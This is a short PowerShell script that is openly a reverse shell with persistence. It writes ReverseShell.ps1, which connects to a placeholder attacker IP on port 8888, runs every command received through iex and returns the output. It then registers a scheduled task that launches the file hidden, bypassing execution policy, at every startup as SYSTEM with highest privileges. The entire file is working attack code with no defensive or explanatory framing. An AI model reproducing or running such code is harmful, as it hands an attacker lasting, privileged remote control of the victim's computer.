$scriptDirectory = $PSScriptRoot
$scriptFileName = "ReverseShell.ps1"

# Combine the directory path and file name to get the full path to the script
$scriptPath = Join-Path -Path $scriptDirectory -ChildPath $scriptFileName

$attackerIP = "CHANGETHISTOATTACKERIP" # Attacker machine IP
$port = 8888 # Attacker machine port

$scriptContent = @"
$client = New-Object System.Net.Sockets.TCPClient('$attackerIP', $port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
"@

# Write out the script content to the file
$scriptContent | Out-File -FilePath $scriptPath -Encoding ASCII

#scheduled task for persistence
$taskAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
$taskTrigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName 'ReverseShell' -Action $taskAction -Trigger $taskTrigger -User 'SYSTEM' -RunLevel Highest -Force
